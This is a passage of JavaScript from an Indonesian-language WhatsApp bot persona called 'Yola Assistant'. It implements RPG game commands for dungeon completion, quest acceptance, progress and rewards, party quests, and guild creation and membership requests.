                    const lastDungeonKey = Object.keys(userRPG.lastDungeon || {}).sort((a, b) => userRPG.lastDungeon[b] - userRPG.lastDungeon[a])[0];
                    if (lastDungeonKey && userRPG.lastDungeon[lastDungeonKey] > (Date.now() - 5000)) {
                        return reply("────୨ Yola Assistant ৎ────\n✅ Kakak baru aja selesaiin dungeon. Hadiahnya udah dikasih kok~\n────୨ Yola Assistant ৎ────");
                    }
                    return reply("────୨ Yola Assistant ৎ────\n❌ Kakak lagi gak di dalem dungeon aktif nih.\n────୨ Yola Assistant ৎ────");
                }

                const now = Date.now();
                const action = userRPG.currentAction;
                const dungeonId = action.dungeonId;
                const dungeonData = rpgDungeons.find(d => d.id === dungeonId);

                if (!dungeonData) {
                    userRPG.currentAction = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data dungeonnya gak ketemu nih... Aksinya Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                }

                if (now < action.endTime) {
                    const remainingTime = Math.ceil((action.endTime - now) / 1000);
                    return reply(`────୨ Yola Assistant ৎ────\n⏳ Belum selesai nih, Kak! Tunggu ${remainingTime} detik lagi yaa.\n────୨ Yola Assistant ৎ────`);
                }

                let goldReward = generateRandomNumber(dungeonData.rewards.goldMin, dungeonData.rewards.goldMax);
                let xpReward = generateRandomNumber(dungeonData.rewards.xpMin, dungeonData.rewards.xpMax);
                let itemRewardsText = "";
                let obtainedItems = {};

                if (action.type === 'dungeon_party_active' && action.partyId) {
                    const partyData = parties[action.partyId];
                    if (partyData && partyData.members.length > 1) {
                        goldReward = Math.floor(goldReward * DUNGEON_PARTY_MULTIPLIER);
                        xpReward = Math.floor(xpReward * DUNGEON_PARTY_MULTIPLIER);
                    }
                }


                userRPG.currency.gold = (userRPG.currency.gold || 0) + goldReward;
                userRPG.xp = (userRPG.xp || 0) + xpReward;
                userRPG.totalXpEarned = (userRPG.totalXpEarned || 0) + xpReward;
                userRPG.lastDungeon[dungeonId] = now;

                if (dungeonData.rewards.items && dungeonData.rewards.itemChance > 0) {
                    for (let i = 0; i < (dungeonData.rewards.maxItems || 1); i++) {
                        if (Math.random() < dungeonData.rewards.itemChance) {
                            const randomItemId = pickRandom(dungeonData.rewards.items);
                            if (rpgItems[randomItemId]) {
                                obtainedItems[randomItemId] = (obtainedItems[randomItemId] || 0) + 1;
                                if (!userRPG.inventory[randomItemId]) userRPG.inventory[randomItemId] = 0;
                                userRPG.inventory[randomItemId]++;
                                updateQuestProgress(m.sender, 'collect', {
                                    target: randomItemId,
                                    location: dungeonId
                                }, 1);
                                itemRewardsText += `   - ${capital(rpgItems[randomItemId].name)} x1\n`;
                            }
                        }
                    }
                }

                checkForLevelUp(m.sender, reply);
                userRPG.currentAction = null;

                saveUsers(m.sender);

                if (action.type === 'dungeon_party_active' && action.partyId) {
                    const partyData = parties[action.partyId];
                    if (partyData) {
                        partyData.currentDungeon = null;
                        partyData.points = (partyData.points || 0) + Math.floor(xpReward / 10);
                        saveParties();
                    }
                }

                let completeMsg = `────୨ Yola Assistant ৎ────\n🎉 Dungeon *${dungeonData.name}* Selesai! Yeay! 🎉\n\n`;
                completeMsg += `✨ Kakak dapet:\n   +${toRupiah(xpReward)} XP\n   +${toRupiah(goldReward)} 🪙 Emas\n`;
                if (itemRewardsText) {
                    completeMsg += "🎁 Item yang didapet:\n" + itemRewardsText;
                }
                await reply(`${completeMsg}\n────୨ Yola Assistant ৎ────`);

                if (userRPG.quest && isQuestCompleted(m.sender, userRPG.quest)) {
                    await reply(`────୨ Yola Assistant ৎ────\n🔔 Quest *${rpgQuests[userRPG.quest].name}* kayaknya udah selesai nih! Coba deh ketik *${prefix}questcomplete* buat ambil hadiahnya!\n────୨ Yola Assistant ৎ────`);
                }

            }
            break;


            case 'acceptquest': {
                const questId = args[0];
                if (!questId) return reply(`────୨ Yola Assistant ৎ────\n❓ Masukin ID Quest-nya dong, Kak. Cek ${prefix}questlist yaa~\n────୨ Yola Assistant ৎ────`);
                if (userRPG.quest) return reply(`────୨ Yola Assistant ৎ────\n❌ Kakak udah punya quest aktif nih: *${rpgQuests[userRPG.quest]?.name || 'Gak Tau Namanya'}*. Selesain atau batalin dulu ya pakai (${prefix}abandonquest).\n────୨ Yola Assistant ৎ────`);
                if (userRPG.currentAction || userRPG.pendingAction) return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak lagi ada kerjaan lain atau lagi siap-siap mau ngapain gitu. Selesain/batalin dulu yaa!\n────୨ Yola Assistant ৎ────`);

                const questData = rpgQuests[questId];
                if (!questData) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Quest dengan ID \`${questId}\` gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                if (questData.levelRequirement && userRPG.level < questData.levelRequirement) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, level Kakak (${userRPG.level}) belum cukup buat quest ini (Minimal Lv.${questData.levelRequirement} yaa).\n────୨ Yola Assistant ৎ────`);
                const currentRankValue = rankThresholds[getRankByTotalXp(userRPG.totalXpEarned)] || 0;
                const requiredRankValue = rankThresholds[questData.rankRequirement] || 0;
                if (questData.rankRequirement && currentRankValue < requiredRankValue) return reply(`────୨ Yola Assistant ৎ────\n❌ Rank Kakak (${getRankByTotalXp(userRPG.totalXpEarned)}) belum cukup untuk quest ini (Minimal Rank ${questData.rankRequirement}).\n────୨ Yola Assistant ৎ────`);
                if (userRPG.completedQuests?.[questId] && !questData.isRepeatable) return reply("────୨ Yola Assistant ৎ────\n✅ Kakak udah pernah selesaiin quest ini sebelumnya.\n────୨ Yola Assistant ৎ────");
                if (questData.isPartyOnlyQuest && !userRPG.partyId) return reply("────୨ Yola Assistant ৎ────\n❌ Quest ini hanya bisa diambil jika Kakak memiliki party!\n────୨ Yola Assistant ৎ────");

                userRPG.quest = questId;
                userRPG.questProgress = userRPG.questProgress || {};
                userRPG.questProgress[questId] = {};

                saveUsers(m.sender);
                let acceptReplyText = `────୨ Yola Assistant ৎ────\n✅ Oke! Quest diterima: *${questData.name}*\n_${questData.description}_\n\n`;

                if (questData.duration) {
                    acceptReplyText += `Quest ini butuh waktu buat diselesain. Ketik *${prefix}startquest* buat mulai simulasinya ya (${questData.duration / 1000} detik).`;
                } else {
                    acceptReplyText += `Kerjain objektifnya ya, Kak! Cek progresnya pakai *${prefix}queststatus*. Kalau udah selesai, pakai *${prefix}questcomplete*.`;
                    let dungeonSuggestion = "";
                    for (const objective of questData.objectives) {
                        if ((objective.type === "kill" || objective.type === "collect") && objective.location) {
                            const locDungeon = rpgDungeons.find(d => d.id === objective.location);
                            if (locDungeon) {
                                dungeonSuggestion = `\n💡 Tips dari Yola: Objektif "${capital(objective.type)} ${Array.isArray(objective.target) ? objective.target.map(t => capital(t)).join('/') : capital(objective.target)}" bisa diselesain di dungeon *${locDungeon.name}* (ID: \`${locDungeon.id}\`).`;
                                if (questData.isPartyOnlyQuest || locDungeon.isPartyOnly) dungeonSuggestion += ` (Hanya Party!)`;
                                break;
                            }
                        }
                    }
                    if (dungeonSuggestion) acceptReplyText += dungeonSuggestion;
                }

                await reply(`${acceptReplyText}\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'startquest': {
                if (!userRPG.quest) return reply("────୨ Yola Assistant ৎ────\n❌ Kakak gak punya quest aktif nih.\n────୨ Yola Assistant ৎ────");
                const questId = userRPG.quest;
                const questData = rpgQuests[questId];

                if (!questData) {
                    userRPG.quest = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data quest aktifnya gak valid... Quest-nya Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                }

                if (userRPG.currentAction || userRPG.pendingAction) return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak lagi ada kerjaan lain atau lagi siap-siap mau ngapain gitu. Selesain/batalin dulu yaa!\n────୨ Yola Assistant ৎ────`);
                if (questData.isPartyOnlyQuest && !userRPG.partyId) return reply("────୨ Yola Assistant ৎ────\n❌ Quest ini hanya bisa dimulai jika Kakak memiliki party!\n────୨ Yola Assistant ৎ────");
                 if (questData.duration === undefined || questData.duration === null) return reply("────୨ Yola Assistant ৎ────\n❌ Quest ini tidak memiliki durasi simulasi.\n────୨ Yola Assistant ৎ────");


                if (userRPG.pendingAction?.type === 'quest_pending' && userRPG.pendingAction?.questId === questId) {
                         const now = Date.now();
                        const endTime = now + questData.duration;

                         let membersToStart = [m.sender];
                         let partyMembersJid = [];

                         if (questData.isPartyOnlyQuest && userRPG.partyId) {
                             const partyData = parties[userRPG.partyId];
                             if (partyData) {
                                 partyMembersJid = partyData.members;
                                 membersToStart = partyMembersJid.filter(memberJid =>
                                     registeredUsers[memberJid]?.rpg?.pendingAction?.type === 'quest_pending' &&
                                     registeredUsers[memberJid]?.rpg?.pendingAction?.questId === questId &&
                                     !registeredUsers[memberJid]?.rpg?.currentAction
                                 );

                                 if (membersToStart.length !== partyMembersJid.length) {
                                     const notReadyMembers = partyMembersJid.filter(jid => !membersToStart.includes(jid));
                                     const notReadyMentions = notReadyMembers.map(jid => `@${jid.split('@')[0]}`).join(', ');
                                     await reply(`────୨ Yola Assistant ৎ────\n⚠️ Aduh, gak semua anggota party siap buat mulai quest *${questData.name}*. Anggota yang belum siap: ${notReadyMentions}. Quest ini hanya akan dimulai dengan ${membersToStart.length} anggota party yang siap.\n────୨ Yola Assistant ৎ────`, { mentions: partyMembersJid });
                                 }

                                 if (membersToStart.length === 0) {
                                     partyData.members.forEach(memberJid => {
                                         if (registeredUsers[memberJid]?.rpg?.pendingAction?.type === 'quest_pending' && registeredUsers[memberJid]?.rpg?.pendingAction?.questId === questId) {
                                             registeredUsers[memberJid].rpg.pendingAction = null;
                                             saveUsers(memberJid);
                                         }
                                     });
                                     return reply("────୨ Yola Assistant ৎ────\n❌ Gak ada anggota party yang siap, jadi quest party-nya Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                                 }
                             }
                         }

                        const initialMsg = await reply(`────୨ Yola Assistant ৎ────\n▶️ Oke! Simulasi quest *${questData.name}* dimulai! Bakal berlangsung selama ${questData.duration / 1000} detik. Semangat yaa~${membersToStart.length > 1 ? `\nDimulai bersama ${membersToStart.map(jid => `@${jid.split('@')[0]}`).join(', ')}.` : ''}\n────୨ Yola Assistant ৎ────`, { mentions: membersToStart });


                        membersToStart.forEach(memberJid => {
                            if (registeredUsers[memberJid]?.rpg) {
                                registeredUsers[memberJid].rpg.currentAction = {
                                    type: 'quest_active',
                                    questId: questId,
                                    partyId: questData.isPartyOnlyQuest ? userRPG.partyId : null,
                                    startTime: now,
                                    endTime: endTime
                                };
                                registeredUsers[memberJid].rpg.pendingAction = null;
                                saveUsers(memberJid);
                                // Only run simulation for the leader in a party, otherwise run for solo
                                if (!questData.isPartyOnlyQuest || memberJid === m.sender) {
                                     runSimulation(memberJid, 'quest', questId, endTime, m.chat, initialMsg.key);
                                }
                            }
                        });

                         if (questData.isPartyOnlyQuest && userRPG.partyId && parties[userRPG.partyId]) {
                             parties[userRPG.partyId].currentQuest = {
                                 id: questId,
                                 startTime: now,
                                 endTime: endTime
                             };
                             saveParties();
                         }


                    } else {
                        userRPG.pendingAction = {
                            type: 'quest_pending',
                            questId: questId,
                            startTime: Date.now()
                        };
                        saveUsers(m.sender);
                         if (questData.isPartyOnlyQuest && userRPG.partyId) {
                            const partyData = parties[userRPG.partyId];
                            if (partyData) {
                                partyData.members.forEach(memberJid => {
                                    if (registeredUsers[memberJid]?.rpg && memberJid !== m.sender) {
                                        registeredUsers[memberJid].rpg.pendingAction = {
                                            type: 'quest_pending',
                                            questId: questId,
                                            partyId: userRPG.partyId,
                                            startTime: Date.now()
                                        };
                                        saveUsers(memberJid);
                                    }
                                });
                                await reply(`────୨ Yola Assistant ৎ────\n⏳ Leader @${m.sender.split('@')[0]} siap-siap buat mulai simulasi quest party *${questData.name}*... Ini bakal makan waktu ${questData.duration / 1000} detik.\nAnggota party, pastikan kalian juga siap ya!\nLeader, ketik *${prefix}startquest* lagi buat konfirmasi dan mulai bareng-bareng!\n────୨ Yola Assistant ৎ────`, { mentions: partyData.members });

                            } else {
                                await reply(`────୨ Yola Assistant ৎ────\n⏳ Siap-siap ya, Kak, buat mulai simulasi quest *${questData.name}*... Ini bakal makan waktu ${questData.duration / 1000} detik.\nKetik *${prefix}startquest* lagi buat konfirmasi dan mulai.\n────୨ Yola Assistant ৎ────`);
                            }
                         } else {
                             await reply(`────୨ Yola Assistant ৎ────\n⏳ Siap-siap ya, Kak, buat mulai simulasi quest *${questData.name}*... Ini bakal makan waktu ${questData.duration / 1000} detik.\nKetik *${prefix}startquest* lagi buat konfirmasi dan mulai.\n────୨ Yola Assistant ৎ────`);
                         }

                    }
            }
            break;

            case 'abandonquest': {
                if (!userRPG.quest && !userRPG.pendingAction?.type.startsWith('quest_') && !userRPG.currentAction?.type.startsWith('quest_')) return reply("────୨ Yola Assistant ৎ────\n❌ Kakak gak punya quest aktif atau persiapan quest buat dibatalin.\n────୨ Yola Assistant ৎ────");

                let questIdToAbandon;
                let questName = 'Gak Tau Namanya';
                let wasActive = false;
                let partyId = null;

                if (userRPG.currentAction?.type === 'quest_active') {
                    questIdToAbandon = userRPG.currentAction.questId;
                    questName = rpgQuests[questIdToAbandon]?.name || questName;
                    partyId = userRPG.currentAction.partyId;
                    userRPG.currentAction = null;
                    wasActive = true;
                } else if (userRPG.pendingAction?.type === 'quest_pending') {
                    questIdToAbandon = userRPG.pendingAction.questId;
                    questName = rpgQuests[questIdToAbandon]?.name || questName;
                    partyId = userRPG.pendingAction.partyId;
                    userRPG.pendingAction = null;
                } else if (userRPG.quest) { // Fallback if no action state but quest exists
                    questIdToAbandon = userRPG.quest;
                     questName = rpgQuests[questIdToAbandon]?.name || questName;
                     partyId = rpgQuests[questIdToAbandon]?.isPartyOnlyQuest ? userRPG.partyId : null;
                     userRPG.quest = null;
                     if (userRPG.questProgress && userRPG.questProgress[questIdToAbandon]) {
                         delete userRPG.questProgress[questIdToAbandon];
                     }
                } else {
                     return reply("────୨ Yola Assistant ৎ────\n❌ Kakak gak punya quest aktif atau persiapan quest buat dibatalin.\n────୨ Yola Assistant ৎ────");
                }


                if (userRPG.quest && userRPG.quest === questIdToAbandon) {
                     userRPG.quest = null;
                     if (userRPG.questProgress && userRPG.questProgress[questIdToAbandon]) {
                         delete userRPG.questProgress[questIdToAbandon];
                     }
                }

                saveUsers(m.sender);

                if (partyId && parties[partyId]) {
                    parties[partyId].currentQuest = null;
                    saveParties();
                }

                await reply(`────୨ Yola Assistant ৎ────\n🗑️ Oke! Quest *${questName}* (ID: ${questIdToAbandon || 'gak diketahui'}) ${wasActive ? 'yang lagi jalan ' : ''}udah Yola batalin ya.\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'queststatus': {
                if (!userRPG.quest) return reply("────୨ Yola Assistant ৎ────\n❌ Kakak gak punya quest aktif nih.\n────୨ Yola Assistant ৎ────");
                const questId = userRPG.quest;
                const questData = rpgQuests[questId];
                if (!questData) {
                    userRPG.quest = null;
                    userRPG.currentAction = null;
                    if (userRPG.questProgress && userRPG.questProgress[questId]) delete userRPG.questProgress[questId];
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data quest aktifnya gak valid... Quest-nya Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                }
                const questProgress = userRPG.questProgress?.[questId] || {};
                let statusText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Status Quest: ${questData.name}* 📊\n│✧\n│✧ _${questData.description}_\n│✧\n│✧ *Objektifnya:* \n`;
                let allObjectivesMet = true;
                questData.objectives.forEach(obj => {
                    const objectiveKey = `${obj.type}_${Array.isArray(obj.target) ? obj.target.join('+') : obj.target}`;
                    const currentCount = questProgress[objectiveKey] || 0;
                    const requiredCount = obj.count;
                    const isMet = currentCount >= requiredCount;
                    if (!isMet) allObjectivesMet = false;
                    statusText += `│✧  - ${isMet ? '✅' : '⏳'} ${capital(obj.type)} ${Array.isArray(obj.target) ? obj.target.map(t => capital(t)).join('/') : capital(obj.target)} (${currentCount}/${requiredCount})${obj.location ? ` di ${rpgDungeons.find(d => d.id === obj.location)?.name || obj.location}` : ''}\n`;
                });

                let dungeonSuggestion = "";
                let timeRemainingText = "";
                let questIsActive = false;

                if (userRPG.currentAction?.type === 'quest_active' && userRPG.currentAction?.questId === questId) {
                    questIsActive = true;
                    const remainingTime = Math.ceil((userRPG.currentAction.endTime - Date.now()) / 1000);
                    if (remainingTime > 0) {
                        const minutes = Math.floor(remainingTime / 60);
                        const seconds = remainingTime % 60;
                        timeRemainingText = `\n│✧  ⏳ *Waktu simulasi tersisa:* ${minutes > 0 ? minutes + ' menit ' : ''}${seconds} detik`;
                        allObjectivesMet = false;
                    }
                } else if (userRPG.pendingAction?.type === 'quest_pending' && userRPG.pendingAction?.questId === questId) {
                     timeRemainingText = `\n│✧  ⏱️ *Status:* Siap untuk dimulai. Ketik *${prefix}startquest*.`;
                     allObjectivesMet = false;
                }


                if (!allObjectivesMet && !questIsActive) {
                    for (const objective of questData.objectives) {
                        const objectiveKey = `${objective.type}_${Array.isArray(objective.target) ? objective.target.join('+') : objective.target}`;
                        const currentCount = questProgress[objectiveKey] || 0;
                        const requiredCount = objective.count;
                        if (currentCount < requiredCount && (objective.type === "kill" || objective.type === "collect") && objective.location) {
                            const locDungeon = rpgDungeons.find(d => d.id === objective.location);
                            if (locDungeon) {
                                dungeonSuggestion = `\n│✧  💡 Tips dari Yola: Selesain objektifnya di dungeon *${locDungeon.name}* (ID: \`${locDungeon.id}\`) yaa~ ${locDungeon.isPartyOnly ? '(Hanya Party!)' : ''}`;
                                break;
                            }
                        }
                    }
                }

                if (allObjectivesMet && !questIsActive) {
                    statusText += `\n│✧\n│✧ 🎉 Yeay! Semua objektif udah selesai! Pakai *${prefix}questcomplete* buat ambil hadiahnya yaa!\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                } else {
                    statusText += `${timeRemainingText}\n│✧\n│✧ Kerjain objektif yang belum selesai ya, Kak! Semangat! ${dungeonSuggestion}\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                }
                await reply(`${statusText}`);
            }
            break;

            case 'questcomplete': {
                if (!userRPG.quest) {
                    return reply("────୨ Yola Assistant ৎ────\n❌ Kakak gak punya quest aktif buat diselesain nih.\n────୨ Yola Assistant ৎ────");
                }

                const questId = userRPG.quest;
                const questData = rpgQuests[questId];
                if (!questData) {
                    userRPG.quest = null;
                    userRPG.currentAction = null;
                    if (userRPG.questProgress && userRPG.questProgress[questId]) delete userRPG.questProgress[questId];
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\n❌ Aduh, data questnya gak valid... Quest-nya Yola batalin ya.\n────୨ Yola Assistant ৎ────");
                }

                if (userRPG.currentAction?.type === 'quest_active' && userRPG.currentAction?.questId === questId && Date.now() < userRPG.currentAction.endTime) {
                    const remainingTime = Math.ceil((userRPG.currentAction.endTime - Date.now()) / 1000);
                    return reply(`────୨ Yola Assistant ৎ────\n⏳ Quest *${questData.name}* masih jalan nih, Kak. Tunggu ${remainingTime} detik lagi ya sebelum ambil hadiahnya.\n────୨ Yola Assistant ৎ────`);
                }

                if (!isQuestCompleted(m.sender, questId)) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Kakak belum selesaiin semua objektif buat quest *${questData.name}*. Cek *${prefix}queststatus* dulu yaa.\n────୨ Yola Assistant ৎ────`);
                }

                const petualangName = registeredUsers[m.sender]?.name || 'Petualang';
                let questActivityLog = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Log Penyelesaian Quest - ${questData.name}* 📜\n│✧\n`;

                questData.objectives.forEach(obj => {
                    const objectiveKey = `${obj.type}_${Array.isArray(obj.target) ? obj.target.join('+') : obj.target}`;
                    const currentCount = userRPG.questProgress?.[questId]?.[objectiveKey] || obj.count;
                    const actionVerb = obj.type === "kill" ? "mengalahkan" : obj.type === "collect" ? "mengumpulkan" : "menyelesaikan";
                    const targetString = Array.isArray(obj.target) ? obj.target.map(t => capital(t)).join('/') : capital(obj.target);
                    const locationString = obj.location ? ` di ${rpgDungeons.find(d => d.id === obj.location)?.name || obj.location}` : '';
                    const logEntry = `│✧  ✅ ${petualangName} berhasil ${actionVerb} ${currentCount}/${obj.count} ${targetString}${locationString}.\n`;
                    questActivityLog += logEntry;
                });
                questActivityLog += `│✧\n`;


                let rewardText = questActivityLog;
                rewardText += `│✧ 🎉 Quest *${questData.name}* Selesai! Yeay! 🎉\n│✧\n│✧ ✨ Kakak dapet:\n`;
                if (questData.rewards.gold) {
                    userRPG.currency.gold = (userRPG.currency.gold || 0) + questData.rewards.gold;
                    rewardText += `│✧    +${toRupiah(questData.rewards.gold)} 🪙 Emas\n`;
                }
                if (questData.rewards.xp) {
                    userRPG.xp = (userRPG.xp || 0) + questData.rewards.xp;
                    userRPG.totalXpEarned = (userRPG.totalXpEarned || 0) + questData.rewards.xp;
                    rewardText += `│✧    +${toRupiah(questData.rewards.xp)} ✨ XP\n`;
                }
                if (questData.rewards.items) {
                    let itemRewards = [];
                    for (const itemId in questData.rewards.items) {
                        const amount = questData.rewards.items[itemId];
                        if (rpgItems[itemId]) {
                            userRPG.inventory[itemId] = (userRPG.inventory[itemId] || 0) + amount;
                            itemRewards.push(`│✧    + ${amount}x ${capital(rpgItems[itemId].name)}`);
                        }
                    }
                    if (itemRewards.length > 0) {
                        rewardText += `│✧ 🎁 Item:\n` + itemRewards.join('\n');
                    }
                }
                
                if (!userRPG.completedQuests) userRPG.completedQuests = {};
                userRPG.completedQuests[questId] = {
                    timestamp: Date.now()
                };
                userRPG.quest = null;
                if (userRPG.questProgress && userRPG.questProgress[questId]) {
                    delete userRPG.questProgress[questId];
                }
                if (userRPG.currentAction && userRPG.currentAction.type === 'quest_active' && userRPG.currentAction.questId === questId) {
                    if (userRPG.currentAction.partyId && parties[userRPG.currentAction.partyId]) {
                        parties[userRPG.currentAction.partyId].currentQuest = null;
                        saveParties();
                    }
                    userRPG.currentAction = null;
                }
                if (userRPG.pendingAction && userRPG.pendingAction.type === 'quest_pending' && userRPG.pendingAction.questId === questId) {
                     if (userRPG.pendingAction.partyId && parties[userRPG.pendingAction.partyId]) {
                        parties[userRPG.pendingAction.partyId].currentQuest = null;
                        saveParties();
                    }
                    userRPG.pendingAction = null;
                }


                checkForLevelUp(m.sender, reply);
                saveUsers(m.sender);

                rewardText += `\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                await reply(`${rewardText}`);
            }
            break;

            case 'createguild': {
                if (userRPG.guildId) return reply(`────୨ Yola Assistant ৎ────\n🛡️ Kakak udah gabung di Guild *${guilds[userRPG.guildId]?.name || 'Gak Tau Namanya'}* kok!\n────୨ Yola Assistant ৎ────`);
                if (!text || text.length < 3 || text.length > 20) return reply("────୨ Yola Assistant ৎ────\n❓ Nama Guildnya mau apa nih, Kak? Harus 3-20 karakter yaa.\n────୨ Yola Assistant ৎ────");
                const guildName = text;
                if (Object.values(guilds).some(g => g.name.toLowerCase() === guildName.toLowerCase())) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Nama Guild "${guildName}" udah dipake orang lain.\n────୨ Yola Assistant ৎ────`);
                }
                if ((userRPG.currency.gold || 0) < GUILD_CREATE_COST) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Emas Kakak (${userRPG.currency.gold || 0}) gak cukup nih buat bikin Guild (Perlu ${GUILD_CREATE_COST} 🪙).\n────୨ Yola Assistant ৎ────`);

                userRPG.currency.gold -= GUILD_CREATE_COST;
                rpgCounter.lastGuildId++;
                const newGuildId = rpgCounter.lastGuildId;
                const newGuild = {
                    id: newGuildId,
                    name: guildName,
                    leader: m.sender,
                    members: [m.sender],
                    requests: [],
                    points: 0,
                    createdAt: Date.now()
                };
                guilds[newGuildId] = newGuild;
                userRPG.guildId = newGuildId;

                saveGuilds();
                saveUsers(m.sender);
                saveRpgCounter();

                await reply(`────୨ Yola Assistant ৎ────\n🏰 Yeay! Guild *${guildName}* (ID: ${newGuildId}) berhasil dibikin! Kakak jadi Leadernya! Selamat yaa~\n-${GUILD_CREATE_COST} 🪙 Emas.\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'joinguild': {
                if (userRPG.guildId) return reply(`────୨ Yola Assistant ৎ────\n🛡️ Kakak udah gabung di Guild kok!\n────୨ Yola Assistant ৎ────`);
                if (!q) return reply("────୨ Yola Assistant ৎ────\n❓ Mau gabung ke Guild mana nih, Kak? Masukin ID Guildnya yaa.\n────୨ Yola Assistant ৎ────");
                const guildIdToJoin = parseInt(q);
                if (isNaN(guildIdToJoin) || !guilds[guildIdToJoin]) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Guild dengan ID ${guildIdToJoin} gak Yola temuin.\n────୨ Yola Assistant ৎ────`);

                const guild = guilds[guildIdToJoin];
                if (guild.members.length >= GUILD_MAX_MEMBERS) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Guild *${guild.name}* udah penuh nih (${guild.members.length}/${GUILD_MAX_MEMBERS}).\n────୨ Yola Assistant ৎ────`);
                if (guild.requests.includes(m.sender)) return reply(`────୨ Yola Assistant ৎ────\n⏳ Kakak udah ngirim permintaan gabung ke Guild *${guild.name}* kok. Tunggu balesan Leadernya yaa~\n────୨ Yola Assistant ৎ────`);

                guild.requests.push(m.sender);
                saveGuilds();

                const leaderJid = guild.leader;
                const leaderData = registeredUsers[leaderJid];
                const leaderName = leaderData?.name || leaderJid.split('@')[0];
                const senderData = registeredUsers[m.sender];
                const senderName = senderData.name;
                const senderRpgId = senderData.rpgId;
                let messageContent = `────୨ Yola Assistant ৎ────\n🔔 Ada yang mau gabung Guild nih, Leader! 🔔\n\nPetualang *${senderName}* (ID: ${senderRpgId}) pengen gabung sama Guild *${guild.name}*.\n\nBuat nerima atau nolak, pakai:\n*${prefix}acceptguild ${senderRpgId}*\n*${prefix}rejectguild ${senderRpgId}*\n────୨ Yola Assistant ৎ────`;

                if (currentMenuStyle === 'V1') {
                    const buttons = [{
                        buttonId: `${prefix}handle_guild_accept_req_${senderJid}`,
                        buttonText: {
                            displayText: '✅ Terima'
                        },
                        type: 1
                    }, {
                        buttonId: `${prefix}handle_guild_reject_req_${senderJid}`,
                        buttonText: {
                            displayText: '❌ Tolak'
                        },
                        type: 1
                    }];
                    await yola.sendMessage(leaderJid, {
                        text: messageContent,
                        buttons: buttons,
                        footer: "Pilih tindakanmu yaa, Leader!",
                        headerType: 1,
                        contextInfo: defaultContextInfoBuilder(leaderName, command).externalAdReply
                    });
                } else {
                    await yola.sendMessage(leaderJid, {
                        text: `${messageContent}`,
                        contextInfo: defaultContextInfoBuilder(leaderName, command).externalAdReply
                    });
                }
                await reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Permintaan gabung ke Guild *${guild.name}* (ID: ${guildIdToJoin}) udah Yola kirim. Tunggu balesan Leadernya yaa, Kak~\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'acceptguild':
            case 'handle_guild_accept_req': {
                const targetIdentifier = command === 'acceptguild' ? args[0] : body.split('_')[3];
                if (!targetIdentifier) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau nerima permintaan dari siapa nih, Leader? Masukin ID Petualangnya yaa.\nContoh: ${prefix}acceptguild 123\n────୨ Yola Assistant ৎ────`);
                const targetJid = command === 'acceptguild' ? findUserJid(targetIdentifier, m) : targetIdentifier;

                if (!targetJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pengguna dengan ID/input "${targetIdentifier}" gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                if (!registeredUsers[targetJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Pengguna @${targetJid.split('@')[0]} belum terdaftar petualang, Leader.\n────୨ Yola Assistant ৎ────`, { mentionedJid: [targetJid] });

                if (!userRPG.guildId) return reply("────୨ Yola Assistant ৎ────\n🛡️ Leader kan gak gabung di Guild mana-mana...\n────୨ Yola Assistant ৎ────");
                const guild = guilds[userRPG.guildId];
                if (!guild || guild.leader !== m.sender) return reply("────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Leader Guild yang boleh nerima anggota baru.\n────୨ Yola Assistant ৎ────");

                if (!guild.requests.includes(targetJid)) return reply(`────୨ Yola Assistant ৎ────\n❌ Petualang @${targetJid.split('@')[0]} lagi gak minta gabung kok, Leader.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                if (guild.members.includes(targetJid)) return reply(`────୨ Yola Assistant ৎ────\n✅ Petualang @${targetJid.split('@')[0]} udah jadi anggota Guild ini kok, Leader.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
                if (guild.members.length >= GUILD_MAX_MEMBERS) return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Guild *${guild.name}* udah penuh nih, Leader.\n────୨ Yola Assistant ৎ────`);
                if (registeredUsers[targetJid]?.rpg?.guildId) return reply(`────୨ Yola Assistant ৎ────\n❌ Petualang @${targetJid.split('@')[0]} udah gabung di Guild lain, Leader.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });

                guild.requests = guild.requests.filter(jid => jid !== targetJid);
                guild.members.push(targetJid);
                registeredUsers[targetJid].rpg.guildId = userRPG.guildId;
                guild.points = (guild.points || 0) + 10;

                saveGuilds();
                saveUsers(targetJid);

